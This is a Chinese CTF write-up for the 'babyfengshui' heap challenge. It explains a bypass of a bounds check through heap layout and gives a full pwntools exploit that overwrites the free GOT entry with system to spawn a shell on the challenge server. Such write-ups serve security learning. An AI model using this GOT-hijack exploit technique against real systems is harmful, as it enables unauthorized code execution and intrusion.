    攻防世界pwn进阶题-babyfengshui

    保护机制：

    Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)

    分析程序：

    菜单题，输入0创建一个note，一个note对应两个chunk：存放content的chunk，和struct结构体chunk。
    name可以输入124字节，
    然后进入sub_8048724函数，输入text_length，注意这里有一个if判断：

    if ( (char *)(v3 + *(_DWORD *)ptr[a1]) >= (char *)ptr[a1] - 4 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }

    意思是上一块的chunk的数据开始加上输入字符串的长度（变量v3），不能超过下一个chunk的size字段。而这个检测在两个chunk相邻时是有效的，但是如果两个chunk不相邻时就会无效。
    所以这里可以利用一下，令两个note不相邻即可，即可以是包含关系。
    关于利用点的说明：

    可以看到chunk0_struct这个chunk来到了末尾，chunk0的前后两个chunk刚好把其余部分全部包含在它的“内部”了。（真佩服作者的脑洞，这里主要是利用了堆申请的规则来构造绕过）
    于是我们就可以往“内部”写数据，无惧检测，直接溢出到chunk1。
    这里我们另外分配一小块chunk （chunk2）用于存储我们的binsh字符串。等待最后的delete(2)来getshell。

    利用步骤：

    1.创建两个note（4个chunk：chunk0_content、chunk0_struct、chunk1_content、chunk1_struct）
    2.free掉第一个note，2个chunk会合并。
    3.创建大小为第一个note两个chunk之和，这样这个note两个chunk就会被第二个note隔开，于是可以溢出到第二个note。
    4.gothijack，简单堆溢出，利用struct的指针改写got表中的内容

    EXP：

    #coding:utf-8
from pwn import *
from LibcSearcher import *
p=remote('220.249.52.133',48747)
elf=ELF('./babyfengshui')

def add_note(size,length,text):
    p.recvuntil('Action: ')
    p.sendline('0')
    p.recvuntil('size of description: ')
    p.sendline(str(size))
    p.recvuntil('name: ')
    p.sendline('sixpar')
    p.recvuntil('text length: ')
    p.sendline(str(length))
    p.recvuntil('text: ')
    p.sendline(text)
def delete_note(idx):
    p.recvuntil('Action: ')
    p.sendline('1')
    p.recvuntil('index: ')
    p.sendline(str(idx))
def display_note(idx):
    p.recvuntil('Action: ')
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(idx))
def update_note(idx,length,text):
    p.recvuntil('Action: ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('text length: ')
    p.sendline(str(length))
    p.sendlineafter('text: ',text)

add_note(0x80,0x80,'aaa')  #chunk0
add_note(0x80,0x80,'bbb')  #chunk1
add_note(0x8,0x8,'/bin//sh')  #chunk2
delete_note(0)   #chunk0的两个chunk合并了（大小为0x100），放入了unsorted bin 里
add_note(0x100,0x19c,'a'*0x198+p32(elf.got['free'])) #将指向description地址的指针覆盖修改为指向free的got地址。
#原本将打印description的，现在将打印free的地址
#注意，由于之前已经调用过free了，所以现在got表中存着的是真实的free地址。
display_note(1)      #leak                                                  
p.recvuntil('description: ')
free_addr=u32(p.recv(4))
print hex(free_addr)

obj=LibcSearcher('free',free_addr)
libc_base=free_addr-obj.dump('free')
sys_addr=libc_base + obj.dump('system')

update_note(1,0x4,p32(sys_addr))  #这里实际修改的是got表    
#利用现在description的指针是指向got表的原理，改变description指针指向的地址的值改为system函数，即把free的got表地址改为system函数的地址。调用free即调用system
delete_note(2)
p.interactive()

    总结：

    本题给的libc版本是错的，所以我弄了半天，后来还是采用LibcSearcher好了。
    只要把pwn程序和exp一起放到LibcSearcher的安装目录里，然后运行exp即可。
    LibcSearcher会自动根据我们泄露出来的free的地址来寻找适合的libc版本。

    还有，也可以使用在线libc库来查找合适的libc版本，我用随便一次泄露出来的free地址试了一下，果然还是准的。
